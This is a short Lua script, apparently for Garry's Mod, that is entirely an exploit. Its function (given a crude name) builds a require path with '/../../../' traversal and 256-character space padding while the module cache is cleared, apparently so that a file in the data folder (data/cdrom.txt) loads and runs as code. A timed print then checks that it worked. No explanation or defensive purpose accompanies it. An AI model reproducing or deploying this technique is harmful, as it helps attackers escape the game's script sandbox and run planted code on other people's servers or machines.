

local function Blow(Dick)
	Dick = "/../../../"..Dick
	Dick = Dick..string.rep(" ", 256 - #Dick)
	
	local Modules = _MODULES
	_MODULES = {}
		require(Dick)
	_MODULES = Modules
end

Blow("data/cdrom.txt")

timer.Simple(2, function()
	print("! IN_CDROM: ", IN_CDROM)
end)









